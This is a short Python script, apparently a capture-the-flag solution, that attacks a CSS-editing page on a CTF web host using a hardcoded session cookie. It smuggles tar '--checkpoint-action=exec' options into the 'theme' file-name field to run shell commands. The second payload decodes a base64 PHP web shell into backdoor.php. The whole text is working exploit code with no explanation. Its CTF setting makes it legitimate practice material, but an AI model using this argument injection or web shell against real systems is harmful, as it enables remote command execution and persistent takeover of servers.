import requests


cookies = { 'PHPSESSID' : '6ndpu759ngj0pvivdk42e57tns' }
user_md5 = "5d3437151a39b5a13e45af2e71cd1818"


def editCSS(name):
    url_edit = 'https://pasteweb.ctf.zoolab.org/editcss.php'
    value = { 'less' : "" , 'theme' : name}
    r = requests.post(url_edit, data=value, cookies=cookies)  

if __name__ == '__main__':
    editCSS("--checkpoint-action=exec=echo Successful > test.txt ;.css")
    
    editCSS("--checkpoint-action=exec=echo 'PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg=='| base64 -d > backdoor.php ;.css") 
